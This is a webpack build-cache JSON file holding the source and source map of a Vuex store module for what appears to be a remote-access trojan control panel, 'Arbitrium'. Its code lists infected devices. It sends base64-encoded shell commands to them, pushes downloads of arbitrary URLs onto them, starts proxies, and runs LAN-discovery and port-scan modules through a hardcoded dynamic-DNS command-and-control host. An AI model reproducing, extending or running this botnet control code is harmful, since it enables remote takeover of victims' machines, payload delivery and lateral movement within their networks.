{"remainingRequest":"/root/Apps/Arbitrium/Arbitrium_ControlPanel/node_modules/babel-loader/lib/index.js!/root/Apps/Arbitrium/Arbitrium_ControlPanel/node_modules/eslint-loader/index.js??ref--13-0!/root/Apps/Arbitrium/Arbitrium_ControlPanel/src/store/modules/core.js","dependencies":[{"path":"/root/Apps/Arbitrium/Arbitrium_ControlPanel/src/store/modules/core.js","mtime":1609373146724},{"path":"/root/Apps/Arbitrium/Arbitrium_ControlPanel/node_modules/cache-loader/dist/cjs.js","mtime":1608611815941},{"path":"/root/Apps/Arbitrium/Arbitrium_ControlPanel/node_modules/babel-loader/lib/index.js","mtime":1608611816297},{"path":"/root/Apps/Arbitrium/Arbitrium_ControlPanel/node_modules/eslint-loader/index.js","mtime":1608611815501}],"contextDependencies":[],"result":[{"type":"Buffer","data":"base64:"},{"version":3,"sources":["/root/Apps/Arbitrium/Arbitrium_ControlPanel/src/store/modules/core.js"],"names":["axios","state","devicesID","devicesIP","devicesPlatform","devicesThreadID","activeTasks","shellReturns","errorMsg","boolDownload","allProxies","allClearTasks","proxyState","allNetworks","AllportScans","AllGenMods","settingsDefault","portRange","lanRange","getters","actions","getDevices","commit","rootState","tokenAuth","auth","authtoken","get","response","parsedRes","data","error","pingTask","taskInfo","uuid","taskID","ThreadID","url","delay","ms","Promise","resolve","setTimeout","Resp","addTask","taskParams","cmd","btoa","dispatch","shellResp","pushDownload","downParams","output","url_b64","runProxy","deviceInfo","proxySet","settings","runmodule","moduleID","argv","replace","lanSchema","schema","LanIP","portResp","ports","genericModule","runClear","clearResp","clearState","killProxy","mutations","m_ErrorMsg","m_shellResp","push","m_pushDownload","m_Cleared","clearStateObj","m_clearProxy","m_proxySettings","proxySetObj","m_discoverLAN","discoverLanObj","M_genericModule","genericModObj","m_openPorts","portScanObj","portSctruct","m_devicesList","responseData","i","length","j","indexOf"],"mappings":"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","sourcesContent":["import axios from 'axios'\n//import qs from 'qs'\n\n\nconst state = {\n    devicesID: [],\n    devicesIP: [],\n    devicesPlatform: [],\n    devicesThreadID: [],\n    activeTasks: [],\n    shellReturns: [],\n    errorMsg: '',\n    boolDownload: false,\n    allProxies: [],\n    allClearTasks: [],\n    proxyState: [],\n    allNetworks: [],\n    AllportScans: [],\n    AllGenMods: [],\n    settingsDefault: {\n        portRange: \"1-100\",\n        lanRange: \"1-24\"\n    }\n};\n\nconst getters = {\n    \n};\n\nconst actions = {\n    async getDevices({commit, rootState}){\n        try{\n            let tokenAuth = rootState.auth.authtoken;\n            let response = await axios.get(`http://internetorange.myddns.me/livedevices?token=${tokenAuth}`);\n            let parsedRes = response.data;\n            commit(\"m_devicesList\", parsedRes);\n            return parsedRes;\n        }catch(error){\n            commit(\"m_ErrorMsg\", error);\n            return {error};\n        }\n    },\n    /* eslint-disable */\n    async pingTask({commit, rootState} ,taskInfo){\n        let tokenAuth = rootState.auth.authtoken;\n        let {uuid,  taskID, ThreadID} = taskInfo;\n        let url = `http://internetorange.myddns.me/pingtask?hashid=${uuid}&token=${tokenAuth}&taskid=${ThreadID}x${taskID}`;\n        const delay = ms => new Promise(resolve => setTimeout(resolve, ms));\n        \n        let response = await (async()=>{\n            let Resp = {data:'0'};\n            while(Resp.data=='0'){\n                Resp = await axios.get(url);\n                await delay(5000);\n            }\n            return Resp;\n        })()\n\n        return response.data;\n    },\n    /* eslint-enable */\n    async addTask({commit, rootState}, taskParams){\n        try{\n            let tokenAuth = rootState.auth.authtoken;\n            let {uuid, cmd, ThreadID} = taskParams;\n            cmd = btoa(cmd);\n            let taskID = await axios.get(`http://internetorange.myddns.me/addtask?hashid=${uuid}&cmd=${cmd}&token=${tokenAuth}`);\n            let taskInfo = {uuid,  taskID: taskID.data, ThreadID};\n            let shellResp = await this.dispatch('pingTask', taskInfo);\n            commit(\"m_shellResp\", uuid, cmd, shellResp);\n            return shellResp;\n        }catch(error){\n            commit(\"m_ErrorMsg\", error);\n            return {error};\n        }\n    },\n    async pushDownload({commit, rootState}, downParams){\n        try{\n            let {uuid, url, output} = downParams;\n            let url_b64 = btoa(url);\n            let tokenAuth = rootState.auth.authtoken;\n            let boolDownload = await axios.get(`http://internetorange.myddns.me/pushdownload?hashid=${uuid}&token=${tokenAuth}&url=${url_b64}&output=${output}`);\n            commit(\"m_pushDownload\", boolDownload.data);\n            return boolDownload.data;\n        }catch(error){\n            commit(\"m_ErrorMsg\", error);\n            return {error};\n        }\n    },\n    async runProxy({commit, rootState}, deviceInfo) {\n        try{\n            let {uuid, ThreadID} = deviceInfo;\n            let tokenAuth = rootState.auth.authtoken;\n            let proxySet = await axios.get(`http://internetorange.myddns.me/runproxy?hashid=${uuid}&token=${tokenAuth}&threadid=${ThreadID}`);\n            commit(\"m_proxySettings\", {uuid, settings: proxySet.data});\n            return proxySet.data;\n        }catch(error){\n            commit(\"m_ErrorMsg\", error);\n            return {error};\n        }\n    },\n    async runmodule({commit, state, rootState}, deviceInfo) {\n        let tokenAuth = rootState.auth.authtoken;\n        try{\n            if (deviceInfo.moduleID=='1'){\n                let {uuid, ThreadID, moduleID} = deviceInfo;\n                let argv = btoa(\" \" +state.settingsDefault.lanRange)\n                        .replace(/=/g,\"equal\")\n                        .replace(/\\//g,\"slash\")\n                        .replace(/\\+/g,\"plus\");\n                let lanSchema = await axios.get(`http://internetorange.myddns.me/runmodule?hashid=${uuid}&token=${tokenAuth}&threadid=${ThreadID}&module=${moduleID}&args=${argv}`);\n                commit('m_discoverLAN', {uuid, schema: lanSchema.data});\n                return lanSchema.data;\n            }else if(deviceInfo.moduleID=='2'){\n                let {uuid, ThreadID, moduleID, LanIP} = deviceInfo;\n                let argv = btoa(LanIP + \" \" +state.settingsDefault.portRange)\n                        .replace(/=/g,\"equal\")\n                        .replace(/\\//g,\"slash\")\n                        .replace(/\\+/g,\"plus\");\n                let portResp = await axios.get(`http://internetorange.myddns.me/runmodule?hashid=${uuid}&token=${tokenAuth}&threadid=${ThreadID}&module=${moduleID}&args=${argv}`);\n                commit('m_openPorts', {uuid, LanIP, ports: portResp.data});\n                return portResp.data;\n            }else{\n                let {uuid, ThreadID, moduleID} = deviceInfo;\n                let genericModule = await axios.get(`http://internetorange.myddns.me/runmodule?hashid=${uuid}&token=${tokenAuth}&threadid=${ThreadID}&module=${moduleID}`);\n                commit('m_genericModule', {uuid, data: genericModule.data});\n                return genericModule.data;\n            }\n        }catch(error){\n            commit('m_ErrorMsg', error);\n            return {error};\n        }\n    },\n    async runClear({commit, rootState}, deviceInfo) {\n        try{\n            let {uuid} = deviceInfo;\n            let tokenAuth = rootState.auth.authtoken;\n            let clearResp = await axios.get(`http://internetorange.myddns.me/cleartasks?hashid=${uuid}&token=${tokenAuth}`);\n            commit(\"m_Cleared\", {uuid, clearState: clearResp.data});\n            return clearResp.data;\n        }catch(error){\n            commit(\"m_ErrorMsg\", error);\n            return {error};\n        }\n    },\n    async killProxy({commit, rootState}, deviceInfo) {\n        try{\n            let {uuid} = deviceInfo;\n            let tokenAuth = rootState.auth.authtoken;\n            let clearResp = await axios.get(`http://internetorange.myddns.me/killproxy?hashid=${uuid}&token=${tokenAuth}`);\n            commit(\"m_clearProxy\", {uuid, clearState: clearResp.data});\n            return clearResp.data;\n        }catch(error){\n            commit(\"m_ErrorMsg\", error);\n            return {error};\n        }\n    },\n\n};\n\nconst mutations = {\n    m_ErrorMsg: (state, error) => (state.errorMsg = error.response.data),\n    m_shellResp (state, uuid, cmd, shellResp) {\n        state.shellReturns.push([uuid, cmd, shellResp])\n    },\n    m_pushDownload: (state, boolDownload) => (state.boolDownload = boolDownload),\n    m_Cleared: (state, clearStateObj) => (state.allClearTasks[clearStateObj.uuid] = clearStateObj.clearState),\n    m_clearProxy:  (state, clearStateObj) => (state.proxyState[clearStateObj.uuid] = clearStateObj.clearState),\n    m_proxySettings: (state, proxySetObj) => (state.allProxies[proxySetObj.uuid] = proxySetObj.settings),\n    m_discoverLAN: (state, discoverLanObj) => (state.allNetworks[discoverLanObj.uuid] = discoverLanObj.schema),\n    M_genericModule: (state, genericModObj) => (state.AllGenMods[genericModObj.uuid] = genericModObj.data),\n    m_openPorts(state, portScanObj){\n        let portSctruct = [];\n        portSctruct[portScanObj.LanIP] = portScanObj.ports;\n        state.AllportScans[portScanObj.uuid] = portSctruct;\n    },\n    m_devicesList(state, responseData){\n        state.devicesID = [];\n        state.devicesIP = []; \n        state.devicesPlatform = [];\n        state.devicesThreadID = [];\n        state.activeTasks = [];\n        for(var i=0; i<responseData.length; i++){\n            state.devicesID.push(responseData[i][0]);\n            state.devicesIP.push(responseData[i][1]);\n            state.devicesPlatform.push(responseData[i][2]);\n            state.devicesThreadID.push(responseData[i][3]);\n            state.activeTasks.push([]);\n            if (responseData[i].length>3){\n                var j;\n                for(j=0;j<responseData[i][4].length;j++){\n                    if(responseData[i][4][j].indexOf('pending')!==-1){\n                        state.activeTasks[i].push(responseData[i][4][j]);\n                    }\n                }\n            }\n\n        }\n    }\n};\n\nexport default {\n    state,\n    getters,\n    actions,\n    mutations\n}\n\n"]}]}